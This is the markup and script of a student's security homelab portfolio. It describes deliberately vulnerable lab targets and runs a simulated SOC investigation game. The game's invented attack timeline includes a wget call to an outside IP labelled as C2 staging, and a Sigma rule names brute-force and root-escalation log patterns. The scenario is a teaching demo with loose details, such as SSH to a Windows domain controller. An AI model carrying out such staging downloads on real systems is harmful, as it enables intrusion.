                data-body="Vulnerable Samba 2.2.x and Apache mod_ssl allow remote code execution for initial foothold. Local kernel exploit (ptrace) escalates to root. The whole attack chain is documented in a writeup. All exploitation traffic is visible in Security Onion — good for practicing detection after completing the offensive exercise."
                data-tags="Samba 2.2.x,mod_ssl,ptrace exploit,Boot2Root" data-connects="Kali (attacker)" data-status="target">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#ff4a5a"></div>
                <div class="topo-node-icon">🔓</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Kioptrix L1</div>
                  <div class="topo-node-ip">192.168.40.30</div>
                  <div class="topo-node-tags"><span>BOOT2ROOT</span><span>SAMBA</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="win11vuln" style="--vc:#ff4a5a;opacity:0.6;"
                data-title="Windows 11 Endpoint (planned)" data-ip="192.168.40.40"
                data-role="Modern endpoint for testing current-gen detection."
                data-body="Intentionally misconfigured Windows 11 workstation — LAPS disabled, SMB signing off, PowerShell execution policy unrestricted. Used for testing modern attack techniques: LOLBAS abuse, scheduled task persistence, WMI lateral movement. Logs shipped to Security Onion via Winlogbeat. Planned to complement Metasploitable 3 with a more realistic modern target."
                data-tags="LOLBAS,SMB,PowerShell,Winlogbeat,LAPS Disabled" data-connects="Kali, Security Onion" data-status="planned">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#666"></div>
                <div class="topo-node-icon">🪟</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Win 11 Target</div>
                  <div class="topo-node-ip">192.168.40.40</div>
                  <div class="topo-node-tags"><span>PLANNED</span><span>LOLBAS</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="vulnapi" style="--vc:#ff4a5a;opacity:0.6;"
                data-title="Vulnerable API Server (planned)" data-ip="192.168.40.50"
                data-role="OWASP API Top 10 training target."
                data-body="Deliberately vulnerable REST API covering OWASP API Top 10: broken object-level auth, excessive data exposure, lack of rate limiting, mass assignment, and SSRF. Designed to practice API-specific attack techniques with Burp Suite and write detection rules for abnormal API usage patterns in Security Onion."
                data-tags="OWASP API,BOLA,SSRF,Mass Assignment,Burp" data-connects="Kali, Security Onion, OpenVAS" data-status="planned">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#666"></div>
                <div class="topo-node-icon">🔌</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Vuln API</div>
                  <div class="topo-node-ip">192.168.40.50</div>
                  <div class="topo-node-tags"><span>PLANNED</span><span>API TOP 10</span></div>
                </div>
              </div>
            </div>
          </div>

          <!-- VLAN 50 DMZ -->
          <div class="topo-vlan" data-vlan="dmz" data-vlan-rate="24" data-vlan-color="#00d4d4">
            <div class="topo-vlan-header" style="--vc:#00d4d4">
              <div class="topo-vlan-header-top">
                <span class="topo-vlan-badge">VLAN 50</span>
                <span class="topo-isolation-tag" style="--ic:rgba(0,212,212,0.1);--ibc:rgba(0,212,212,0.3);color:#00a8a8">INTERNET-FACING</span>
              </div>
              <span class="topo-vlan-name">DMZ</span>
            </div>
            <div class="topo-vlan-nodes">
              <div class="topo-node tnode" data-id="nginx" style="--vc:#00d4d4"
                data-title="Nginx Reverse Proxy" data-ip="192.168.50.10"
                data-role="The only host directly reachable from the internet."
                data-body="Terminates TLS (Let's Encrypt cert via ACME). Reverse-proxies HTTPS requests to Nextcloud and other DMZ services. Rate limiting configured per-endpoint. Request filtering blocks common scanners and bots. Access logs ship to Security Onion for external threat visibility."
                data-tags="TLS Termination,Rate Limiting,ACME,Reverse Proxy" data-connects="Nextcloud, Uptime Kuma, Internet" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#2ecc71"></div>
                <div class="topo-node-icon">↔</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Nginx Proxy</div>
                  <div class="topo-node-ip">192.168.50.10</div>
                  <div class="topo-node-tags"><span>REVERSE PROXY</span><span>TLS</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="nextcloud" style="--vc:#00d4d4"
                data-title="Nextcloud" data-ip="192.168.50.20"
                data-role="Self-hosted cloud storage for lab documentation and config backups."
                data-body="Stores lab writeups, configuration backups, Ansible inventory, and architecture diagrams. OAuth2 authentication delegates to Windows Server AD — single sign-on across the domain. External access via Nginx proxy only. Postgres backend, Redis caching, automated nightly backups to a separate volume."
                data-tags="OAuth2 SSO,Postgres,Redis,Automated Backups" data-connects="Nginx, Win Server (AD auth)" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#2ecc71"></div>
                <div class="topo-node-icon">☁</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Nextcloud</div>
                  <div class="topo-node-ip">192.168.50.20</div>
                  <div class="topo-node-tags"><span>FILE SERVER</span><span>OAUTH</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="wireguard" style="--vc:#00d4d4"
                data-title="WireGuard VPN Gateway" data-ip="192.168.50.30"
                data-role="Remote access VPN — secure off-site lab management."
                data-body="WireGuard peers configured for each trusted device. Split-tunnel routing: only lab subnets (192.168.0.0/16) route through the tunnel, so regular internet traffic stays local. Peer configs are managed by Ansible on the Ubuntu admin server and rotated periodically. Logs ship to Security Onion."
                data-tags="Split Tunnel,Peer Rotation,Ansible Managed,Wireguard" data-connects="Ubuntu (config mgmt), Remote clients" data-status="online">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#2ecc71"></div>
                <div class="topo-node-icon">🔒</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">WireGuard VPN</div>
                  <div class="topo-node-ip">192.168.50.30</div>
                  <div class="topo-node-tags"><span>VPN</span><span>SPLIT TUNNEL</span></div>
                </div>
              </div>
            </div>
          </div>

          <!-- VLAN 60 CLOUD — PLANNED -->
          <div class="topo-vlan" data-vlan="cloud" data-vlan-rate="8" data-vlan-color="#ff9f43" style="opacity:0.6;">
            <div class="topo-vlan-header" style="--vc:#ff9f43">
              <div class="topo-vlan-header-top">
                <span class="topo-vlan-badge">VLAN 60</span>
                <span class="topo-isolation-tag" style="--ic:rgba(255,159,67,0.12);--ibc:rgba(255,159,67,0.35);color:#cc7a20">PLANNED</span>
              </div>
              <span class="topo-vlan-name">Cloud / AWS</span>
            </div>
            <div class="topo-vlan-nodes">
              <div class="topo-node tnode" data-id="aws-vpc" style="--vc:#ff9f43"
                data-title="AWS VPC (Terraform)" data-ip="10.0.1.0/24"
                data-role="Hardened cloud VPC provisioned entirely via Terraform."
                data-body="Multi-AZ VPC with public and private subnets. Security groups follow least-privilege — no 0.0.0.0/0 ingress except port 443 on the ALB. Flow logs enabled on all ENIs and shipped to S3 for CloudTrail correlation. Entire environment is reproducible from a single terraform apply."
                data-tags="Terraform,VPC,Security Groups,Flow Logs" data-connects="GuardDuty, CloudTrail, Lambda" data-status="planned">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#ff9f43"></div>
                <div class="topo-node-icon">☁</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">AWS VPC</div>
                  <div class="topo-node-ip">10.0.1.0/24 · us-east-1</div>
                  <div class="topo-node-tags"><span>TERRAFORM</span><span>VPC</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="guardduty" style="--vc:#ff9f43"
                data-title="GuardDuty + CloudTrail" data-ip="AWS-managed"
                data-role="Cloud-native threat detection and audit logging."
                data-body="GuardDuty monitors VPC flow logs, CloudTrail events, and DNS queries for anomalous behaviour — cryptocurrency mining, credential exfiltration, port scanning from EC2. CloudTrail records every API call across all regions. High-severity GuardDuty findings trigger a Lambda function that sends an SNS alert and writes to S3."
                data-tags="GuardDuty,CloudTrail,SNS,Lambda,S3" data-connects="Lambda, SNS, S3" data-status="planned">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#ff9f43"></div>
                <div class="topo-node-icon">🛡</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">GuardDuty</div>
                  <div class="topo-node-ip">AWS-managed</div>
                  <div class="topo-node-tags"><span>GUARDDUTY</span><span>CLOUDTRAIL</span></div>
                </div>
              </div>
              <div class="topo-node tnode" data-id="sentinel" style="--vc:#ff9f43"
                data-title="Azure Sentinel (planned)" data-ip="Azure-managed"
                data-role="Enterprise SIEM — the tool most Canadian SOC teams actually run."
                data-body="Microsoft Sentinel workspace ingesting Windows Security Event logs from the on-prem lab via AMA. KQL detection rules written for pass-the-hash, brute force, and privilege escalation. Logic Apps playbook fires on high-severity alerts — auto-enriches with VirusTotal and posts to a Teams channel. Chosen because Sentinel dominates the Canadian mid-market."
                data-tags="Sentinel,KQL,Logic Apps,AMA,VirusTotal" data-connects="On-prem lab, Teams, VirusTotal" data-status="planned">
                <div class="topo-node-accent"></div>
                <div class="topo-node-status-dot" style="--sc:#ff9f43"></div>
                <div class="topo-node-icon">📡</div>
                <div class="topo-node-info">
                  <div class="topo-node-name">Azure Sentinel</div>
                  <div class="topo-node-ip">Azure-managed</div>
                  <div class="topo-node-tags"><span>SENTINEL</span><span>KQL</span></div>
                </div>
              </div>
            </div>
          </div>

        </div><!-- end topo-vlans -->
      </div><!-- end topo -->

      <!-- SLIDE-IN DETAIL PANEL -->
      <div id="topo-panel" class="topo-panel">
        <button id="topo-panel-close" class="topo-panel-close">✕</button>
        <div class="topo-panel-header">
          <div id="topo-panel-icon" class="topo-panel-bigicon"></div>
          <div>
            <div id="topo-panel-title" class="topo-panel-title"></div>
            <div id="topo-panel-ip" class="topo-panel-ip"></div>
          </div>
        </div>
        <div id="topo-panel-role" class="topo-panel-role"></div>
        <div class="topo-panel-divider"></div>
        <div id="topo-panel-body" class="topo-panel-body"></div>
        <div class="topo-panel-divider"></div>
        <div class="topo-panel-section-label">SERVICES / TOOLS</div>
        <div id="topo-panel-tags" class="topo-panel-tags"></div>
        <div class="topo-panel-section-label" style="margin-top:.85rem">CONNECTS TO</div>
        <div id="topo-panel-connects" class="topo-panel-connects"></div>
      </div>
    </div>

    <!-- MOBILE: card-based diagram -->
    <div class="diagram-mobile reveal">
      <div class="mob-hub">
        <div class="mob-hub-bar"></div>
        <div class="mob-hub-inner">
          <div class="mob-hub-left"><span class="mob-hub-name">pfSense Firewall</span><span class="mob-hub-ip">192.168.1.1</span></div>
          <span class="mob-status-dot"></span><span class="mob-online">ONLINE</span>
        </div>
        <div class="mob-hub-tags"><span class="mob-tag">FIREWALL</span><span class="mob-tag">VLAN TRUNK</span><span class="mob-tag">NAT</span><span class="mob-tag">IDS/IPS</span><span class="mob-tag">HAPROXY</span></div>
      </div>
      <div class="mob-zones">
        <div class="mob-zone mob-zone-mgmt">
          <div class="mob-zone-label">VLAN 10 — MGMT</div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-blue"></div><div><div class="mob-node-name">Windows Server 2019</div><div class="mob-node-ip">192.168.10.10</div><div class="mob-node-tags"><span class="mob-tag">AD</span><span class="mob-tag">DNS</span><span class="mob-tag">DHCP</span><span class="mob-tag">GPO</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-blue"></div><div><div class="mob-node-name">Ubuntu Server 22.04</div><div class="mob-node-ip">192.168.10.20</div><div class="mob-node-tags"><span class="mob-tag">ANSIBLE</span><span class="mob-tag">TERRAFORM</span><span class="mob-tag">JUMP BOX</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-blue"></div><div><div class="mob-node-name">Windows 10 Workstation</div><div class="mob-node-ip">192.168.10.30</div><div class="mob-node-tags"><span class="mob-tag">ENDPOINT</span><span class="mob-tag">DOMAIN JOINED</span></div></div></div>
        </div>
        <div class="mob-zone mob-zone-sec">
          <div class="mob-zone-label">VLAN 20 — SECURITY</div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-green"></div><div><div class="mob-node-name">Security Onion 2.4</div><div class="mob-node-ip">192.168.20.10</div><div class="mob-node-tags"><span class="mob-tag">SIEM</span><span class="mob-tag">ZEEK</span><span class="mob-tag">ELASTIC</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-green"></div><div><div class="mob-node-name">Kali Linux 2024</div><div class="mob-node-ip">192.168.20.20</div><div class="mob-node-tags"><span class="mob-tag">METASPLOIT</span><span class="mob-tag">BURP</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-green"></div><div><div class="mob-node-name">OpenVAS Scanner</div><div class="mob-node-ip">192.168.20.30</div><div class="mob-node-tags"><span class="mob-tag">VULN SCANNER</span><span class="mob-tag">CVE</span></div></div></div>
        </div>
        <div class="mob-zone mob-zone-mon">
          <div class="mob-zone-label">VLAN 30 — MONITORING</div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-amber"></div><div><div class="mob-node-name">Docker Host</div><div class="mob-node-ip">192.168.30.10</div><div class="mob-node-tags"><span class="mob-tag">PROMETHEUS</span><span class="mob-tag">GRAFANA</span><span class="mob-tag">LOKI</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-amber"></div><div><div class="mob-node-name">AlertManager</div><div class="mob-node-ip">192.168.30.20</div><div class="mob-node-tags"><span class="mob-tag">NODE EXPORTER</span><span class="mob-tag">CADVISOR</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-amber"></div><div><div class="mob-node-name">Uptime Kuma</div><div class="mob-node-ip">192.168.30.30</div><div class="mob-node-tags"><span class="mob-tag">UPTIME</span><span class="mob-tag">HTTP CHECK</span></div></div></div>
        </div>
        <div class="mob-zone mob-zone-lab">
          <div class="mob-zone-label">VLAN 40 — LAB / VICTIM</div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-red"></div><div><div class="mob-node-name">Metasploitable 3</div><div class="mob-node-ip">192.168.40.10</div><div class="mob-node-tags"><span class="mob-tag">VULN TARGET</span><span class="mob-tag">MS17-010</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-red"></div><div><div class="mob-node-name">DVWA</div><div class="mob-node-ip">192.168.40.20</div><div class="mob-node-tags"><span class="mob-tag">SQL INJECTION</span><span class="mob-tag">XSS</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot mob-dot-red"></div><div><div class="mob-node-name">Kioptrix Level 1</div><div class="mob-node-ip">192.168.40.30</div><div class="mob-node-tags"><span class="mob-tag">BOOT2ROOT</span><span class="mob-tag">SAMBA</span></div></div></div>
        </div>
        <div class="mob-zone" style="background:#0e1a1a;border-color:rgba(0,212,212,.25);">
          <div class="mob-zone-label" style="color:#00d4d4;">VLAN 50 — DMZ</div>
          <div class="mob-node"><div class="mob-node-dot" style="background:#00d4d4;box-shadow:0 0 6px #00d4d4;animation:blink 2s step-end infinite;"></div><div><div class="mob-node-name">Nginx Reverse Proxy</div><div class="mob-node-ip">192.168.50.10</div><div class="mob-node-tags"><span class="mob-tag">REVERSE PROXY</span><span class="mob-tag">SSL/TLS</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot" style="background:#00d4d4;box-shadow:0 0 6px #00d4d4;animation:blink 2s step-end infinite;"></div><div><div class="mob-node-name">Nextcloud</div><div class="mob-node-ip">192.168.50.20</div><div class="mob-node-tags"><span class="mob-tag">FILE SERVER</span><span class="mob-tag">SELF-HOSTED</span></div></div></div>
          <div class="mob-node"><div class="mob-node-dot" style="background:#00d4d4;box-shadow:0 0 6px #00d4d4;animation:blink 2s step-end infinite;"></div><div><div class="mob-node-name">WireGuard VPN</div><div class="mob-node-ip">192.168.50.30</div><div class="mob-node-tags"><span class="mob-tag">VPN</span><span class="mob-tag">REMOTE ACCESS</span></div></div></div>
        </div>
      </div>
      <p style="font-family:var(--mono);font-size:10px;color:#2a3050;margin-top:1rem;text-align:center;">VMware Workstation · Windows 11 · View on desktop for interactive diagram</p>
    </div><!-- end diagram-mobile -->
  </div>
</section>

<!-- CONTACT -->
<section id="contact">
  <div class="inner">
    <div class="s-label reveal">
      <span class="s-label-txt">Contact</span>
      <div class="s-label-line"></div>
    </div>
    <div class="contact-cols">
      <div class="contact-text reveal">
        <h2 class="contact-h2">Let's work<br>together.</h2>
        <p>I'm looking for a <strong>co-op placement starting Summer or Fall 2026</strong> — SOC analysis, IT infrastructure, or security operations. Based in Kitchener-Waterloo, open to in-person, hybrid, or remote across Ontario.</p>
        <p>If something in this portfolio is relevant to your team, reach out. I'll respond within a day.</p>
        <div class="contact-availability">
          <span class="contact-avail-dot"></span>
          <span>Actively available · Kitchener-Waterloo, ON</span>
        </div>
      </div>
      <div class="link-list reveal">
        <a href="https://github.com/matthewvaishnav/cst-portfolio" class="ext-link" target="_blank">
          <div><span class="ext-lbl">GitHub</span><span class="ext-val">github.com/matthewvaishnav</span></div>
          <span class="ext-arr">↗</span>
        </a>
        <a href="https://www.linkedin.com/in/matthew-vaishnav-279670229/" class="ext-link" target="_blank">
          <div><span class="ext-lbl">LinkedIn</span><span class="ext-val">matthew-vaishnav</span></div>
          <span class="ext-arr">↗</span>
        </a>
        <a href="https://tryhackme.com/p/matthew.vaishnav" class="ext-link" target="_blank">
          <div><span class="ext-lbl">TryHackMe</span><span class="ext-val">matthew.vaishnav</span></div>
          <span class="ext-arr">↗</span>
        </a>
        <a href="/cdn-cgi/l/email-protection#bbd6dacfcfd3decc95cddad2c8d3d5dacdfbdcd6dad2d795d8d4d6" class="ext-link" id="email-link">
          <div><span class="ext-lbl">Email</span><span class="ext-val"><span class="__cf_email__" data-cfemail="a8c5c9dcdcc0cddf86dec9c1dbc0c6c9dee8cfc5c9c1c486cbc7c5">[email&#160;protected]</span></span></div>
          <span class="ext-arr">↗</span>
        </a>
      </div>
    </div>
  </div>
</section>

<footer>
  <div class="footer-inner">
    <div class="footer-left">
      <p class="footer-name">Matthew Vaishnav</p>
      <p class="footer-sub">Computer Systems Technician · Conestoga College · Class of 2027</p>
      <p class="footer-sub" style="margin-top:.3rem;font-style:italic;opacity:.6;">Built and broken in Kitchener-Kitchener-Waterloo, Ontario.</p>
    </div>
    <div class="footer-links">
      <a href="https://github.com/matthewvaishnav/cst-portfolio" target="_blank">GitHub</a>
      <a href="https://www.linkedin.com/in/matthew-vaishnav-279670229/" target="_blank">LinkedIn</a>
      <a href="https://tryhackme.com/p/matthew.vaishnav" target="_blank">TryHackMe</a>
      <a href="/cdn-cgi/l/email-protection#630e0217170b06144d15020a100b0d021523040e020a0f4d000c0e"><span class="__cf_email__" data-cfemail="75181401011d10025b03141c061d1b1403351218141c195b161a18">[email&#160;protected]</span></a>
    </div>
  </div>
  <div style="text-align:center;padding:.75rem 0 1.25rem;border-top:1px solid rgba(255,255,255,0.03);margin-top:1.5rem;">
    <span id="konami-hint-label">psst — you know the Konami code? </span><span id="konami-hint">— — — — — — — — — —</span>
  </div>
</footer>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
  // Hamburger menu
  const burger = document.getElementById('burger');
  const drawer = document.getElementById('drawer');
  burger.addEventListener('click', () => {
    burger.classList.toggle('open');
    drawer.classList.toggle('open');
  });
  function closeDrawer() {
    burger.classList.remove('open');
    drawer.classList.remove('open');
  }
  // Close drawer on outside click
  document.addEventListener('click', (e) => {
    if (!burger.contains(e.target) && !drawer.contains(e.target)) closeDrawer();
  });

  // Scroll reveal
  const io = new IntersectionObserver((entries) => {
    entries.forEach((e, i) => {
      if (e.isIntersecting) {
        setTimeout(() => e.target.classList.add('in'), i * 65);
        io.unobserve(e.target);
      }
    });
  }, { threshold: 0.07 });
  document.querySelectorAll('.reveal').forEach(el => io.observe(el));

  // ── INTERACTIVE SOC TERMINAL ──
  const out    = document.getElementById('terminal-output');
  const inputRow = document.getElementById('ht-input-row');
  const htInput  = document.getElementById('ht-input');
  const htBadge  = document.getElementById('ht-badge');

  let termReady = false;
  let cmdHistory = [], histIdx = -1;

  const state = {
    alertInvestigated: false,
    logsQueried: false,
    ipLookedUp: false,
    timelineBuilt: false,
    ruleWritten: false,
    solved: false,
  };

  function printLine(html, delay) {
    delay = delay || 0;
    return new Promise(function(res) { setTimeout(function() {
      const div = document.createElement('div');
      div.className = 'ht-line';
      div.innerHTML = html;
      out.appendChild(div);
      out.scrollTop = out.scrollHeight;
      res();
    }, delay); });
  }
  function c(color, text) { return '<span style="color:' + color + '">' + text + '</span>'; }
  const DIM = '#4a5568', HI = '#a0a8be', BRIGHT = '#e4e8f4';
  const GREEN = '#52c97a', AMBER = '#f5c842', RED = '#e05252', BLUE = '#6a9aff';

  function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

  async function typeCmd(text) {
    const div = document.createElement('div');
    div.className = 'ht-line';
    div.innerHTML = '<span style="color:var(--accent)">analyst@soc:~$ </span><span style="color:' + BRIGHT + '" id="typing-span"></span>';
    out.appendChild(div);
    const span = div.querySelector('#typing-span');
    for (let i = 0; i < text.length; i++) {
      span.textContent += text[i];
      out.scrollTop = out.scrollHeight;
      await sleep(36);
    }
    await sleep(280);
  }

  async function blank() { await printLine('&nbsp;'); await sleep(60); }

  async function boot() {
    await printLine(c(DIM, '┌' + '─'.repeat(53) + '┐'));
    await printLine(c(DIM, '│  Security Onion 2.4  ·  Kitchener-Waterloo SOC Lab  │'));
    await printLine(c(DIM, '│  Elastic SIEM  ·  Suricata  ·  Zeek  ·  Kibana      │'));
    await printLine(c(DIM, '└' + '─'.repeat(53) + '┘'));
    await blank();
    await typeCmd('python3 log-correlator.py --watch --live');
    await blank();
    await printLine(c(DIM, '[*] Ingesting live feed from Security Onion...'));
    await printLine(c(DIM, '[*] Watching: auth.log, suricata.log, zeek/conn.log'));
    await sleep(500);
    await blank();
    await printLine(c(AMBER, '[!] ALERT') + '  ' + c(HI, '·') + '  ' + c(BRIGHT, 'BRUTE FORCE → CREDENTIAL COMPROMISE'));
    await printLine('    ' + c(DIM, 'src_ip     :') + '  ' + c(RED, '185.220.101.47') + '  ' + c(DIM, '(Tor exit node · AS205100)'));
    await printLine('    ' + c(DIM, 'target     :') + '  ' + c(BRIGHT, 'root@192.168.10.10') + '  ' + c(DIM, '(Win Server 2019 DC)'));
    await printLine('    ' + c(DIM, 'attempts   :') + '  ' + c(AMBER, '847 failures') + '  ' + c(DIM, 'over 00:03:12'));
    await printLine('    ' + c(DIM, 'success    :') + '  ' + c(RED, 'svc-backup') + '  ' + c(DIM, '@ 03:17:44 UTC'));
    await printLine('    ' + c(DIM, 'ATT&amp;CK     :') + '  ' + c(BLUE, 'T1110.001') + '  ' + c(DIM, '·') + '  ' + c(BLUE, 'T1078 Valid Accounts'));
    await blank();
    await printLine(c(AMBER, '[!] Post-auth activity detected — investigation required'));
    await blank();
    await printLine(c(GREEN, '[+] Interactive mode active. Type  help  to investigate.'));
    await blank();
    htBadge.style.display = 'inline';
    inputRow.style.display = 'block';
    termReady = true;
    if (htInput) htInput.focus();
  }

  const commands = {
    'help': async function() {
      await printLine(c(HI, 'Available investigation commands:'));
      await blank();
      const cmds = [
        ['alert show',     'show the active alert detail'],
        ['logs query',     'search auth.log around the event time'],
        ['ip lookup',      'threat intel on 185.220.101.47'],
        ['timeline build', 'reconstruct the attack chain'],
        ['sigma write',    'generate a detection rule for this TTP'],
        ['incident close', 'write and file the incident report'],
        ['clear',          'clear the terminal'],
      ];
      for (const [cmd, desc] of cmds) {
        await printLine('  ' + c(BLUE, cmd.padEnd(18)) + '  ' + c(DIM, desc));
      }
      await blank();
    },
    'alert show': async function() {
      state.alertInvestigated = true;
      await printLine(c(DIM, '┄'.repeat(54)));
      await printLine(c(AMBER, 'ALERT ID') + '   ' + c(BRIGHT, 'SOC-2026-0347'));
      await printLine(c(AMBER, 'SEVERITY') + '   ' + c(RED, 'HIGH'));
      await printLine(c(AMBER, 'RULE    ') + '   ' + c(BRIGHT, 'brute_force_then_success'));
      await printLine(c(AMBER, 'FIRED   ') + '   ' + c(HI, '2026-01-14 03:17:44 UTC'));
      await blank();
      await printLine(c(DIM,'Source IP') + '  ' + c(RED,'185.220.101.47') + '  →  Tor exit  ·  DE');
      await printLine(c(DIM,'Target   ') + '  ' + c(BRIGHT,'192.168.10.10:22') + '  ' + c(DIM,'(VLAN 10 MGMT — AD DC)'));
      await printLine(c(DIM,'Account  ') + '  ' + c(RED,'svc-backup') + '  ' + c(DIM,'— service account, high priv'));
      await printLine(c(DIM,'Failures ') + '  ' + c(AMBER,'847') + '  ' + c(DIM,'in 192 seconds (4.4/sec)'));
      await printLine(c(DIM,'Final auth') + ' ' + c(RED,'SUCCESS') + '  ' + c(DIM,'03:17:44 —') + '  ' + c(AMBER,'credentials compromised'));
      await printLine(c(DIM, '┄'.repeat(54)));
      await blank();
    },
    'logs query': async function() {
      state.logsQueried = true;
      await printLine(c(DIM, '[*] Querying auth.log ±5 min from 03:17:44...'));
      await sleep(400);
      await printLine(c(DIM, '--- 03:14:32 ---'));
      await printLine(c(DIM,'03:14:32') + '  ' + c(RED,'Failed password') + ' for svc-backup from ' + c(RED,'185.220.101.47') + ' port 44821');
      await printLine(c(DIM,'03:14:33') + '  ' + c(RED,'Failed password') + ' for svc-backup from ' + c(RED,'185.220.101.47') + ' port 44822');
      await printLine(c(DIM,'03:14:34') + '  ' + c(RED,'Failed password') + ' for svc-backup from ' + c(RED,'185.220.101.47') + ' port 44823');
      await printLine(c(DIM,'...     ') + '  ' + c(DIM,'[844 similar entries truncated]'));
      await printLine(c(DIM,'03:17:44') + '  ' + c(GREEN,'Accepted password') + ' for svc-backup from ' + c(RED,'185.220.101.47') + ' port 49001');
      await printLine(c(DIM,'03:18:31') + '  ' + c(AMBER,'New session opened') + ' for svc-backup by (uid=0)');
      await printLine(c(DIM,'03:18:33') + '  ' + c(RED,'pam_unix: session opened for root via svc-backup'));
      await blank();
      await printLine(c(AMBER,'⚠') + '  ' + c(BRIGHT,'svc-backup escalated to root 49 seconds after auth'));
      await blank();
    },
    'ip lookup': async function() {
      state.ipLookedUp = true;
      await printLine(c(DIM, '[*] Querying threat intel — AbuseIPDB · Shodan · Tor Project...'));
      await sleep(500);
      await printLine(c(HI,'IP          ') + c(RED,'185.220.101.47'));
      await printLine(c(HI,'ASN         ') + c(BRIGHT,'AS205100') + '  ' + c(DIM,'· Frantech Solutions (bulletproof hosting)'));
      await printLine(c(HI,'Country     ') + c(BRIGHT,'DE') + '  ' + c(DIM,'— Frankfurt, Germany'));
      await printLine(c(HI,'Tor Exit    ') + c(RED,'YES') + '  ' + c(DIM,'— confirmed exit node'));
      await printLine(c(HI,'AbuseIPDB   ') + c(RED,'Confidence: 97%') + '  ' + c(DIM,'·') + '  ' + c(AMBER,'1,247 reports (last 90d)'));
      await printLine(c(HI,'Last seen   ') + c(AMBER,'SSH brute force') + '  ' + c(DIM,'reported 6 hours ago'));
      await blank();
      await printLine(c(GREEN,'✓') + '  ' + c(BRIGHT,'Confirmed malicious. Block recommended at perimeter.'));
      await blank();
    },
    'timeline build': async function() {
      state.timelineBuilt = true;
      await printLine(c(DIM, '[*] Correlating across auth.log, zeek/conn.log, suricata.log...'));
      await sleep(600);
      await printLine(c(DIM, '─── ATTACK TIMELINE ' + '─'.repeat(38)));
      const tl = [
        ['03:14:32', AMBER, 'T1110.001   ', 'SSH brute force begins — 847 attempts over 192s'],
        ['03:17:44', RED,   'T1078       ', 'Credential compromise — svc-backup accepted'],
        ['03:18:31', RED,   'T1078.003   ', 'Account switches to root — privilege escalation'],
        ['03:19:02', RED,   'T1021.002   ', 'Lateral: SMB mount to 192.168.10.20 (IaC host)'],
        ['03:19:48', RED,   'T1087       ', 'Discovery: /etc/passwd, net user /domain'],
        ['03:21:15', RED,   'T1105       ', 'Ingress: wget 45.33.32.156 — possible C2 staging'],
      ];
      for (const [time, col, ttp, desc] of tl) {
        await printLine('  ' + c(DIM,time) + '  ' + c(col,'●') + '  ' + c(BLUE,ttp) + '  ' + c(HI,desc));
        await sleep(80);
      }
      await printLine(c(DIM, '─'.repeat(55)));
      await blank();
      await printLine(c(RED,'⚠') + '  ' + c(BRIGHT,'Multi-stage intrusion. Attacker reached IaC host.'));
      await printLine('   ' + c(DIM,'Contain before C2 beacon establishes.'));
      await blank();
    },
    'sigma write': async function() {
      state.ruleWritten = true;
      await printLine(c(DIM, '[*] Generating Sigma rule from observed TTP pattern...'));
      await sleep(350);
      await printLine(c(DIM, '─── sigma/brute_force_to_root.yml ' + '─'.repeat(26)));
      const rule = [
        c(BLUE,'title') + ': ' + c(BRIGHT,'SSH Brute Force Followed by Root Escalation'),
        c(BLUE,'status') + ': ' + c(GREEN,'stable'),
        c(BLUE,'description') + ': ' + c(HI,'Rapid SSH failures then success + uid=0 session'),
        c(BLUE,'logsource') + ':',
        '  ' + c(BLUE,'product') + ': ' + c(BRIGHT,'linux') + '   ' + c(BLUE,'service') + ': ' + c(BRIGHT,'auth'),
        c(BLUE,'detection') + ':',
        '  ' + c(BLUE,'brute_fail') + ': ' + c(BRIGHT,"keywords: 'Failed password'"),
        '  ' + c(BLUE,'auth_ok') + ':   ' + c(BRIGHT,"keywords: 'Accepted password'"),
        '  ' + c(BLUE,'escalate') + ':  ' + c(BRIGHT,"keywords: 'session opened for root'"),
        '  ' + c(BLUE,'timeframe') + ': ' + c(AMBER,'2m'),
        '  ' + c(BLUE,'condition') + ': ' + c(BRIGHT,'brute_fail | count() > 10 | auth_ok | escalate'),
        c(BLUE,'level') + ': ' + c(RED,'high'),
        c(BLUE,'tags') + ': ' + c(BLUE,"['T1110.001','T1078','attack.credential_access']"),
      ];
      for (const line of rule) {
        await printLine('  ' + line);
        await sleep(40);
      }
      await printLine(c(DIM, '─'.repeat(55)));
      await blank();
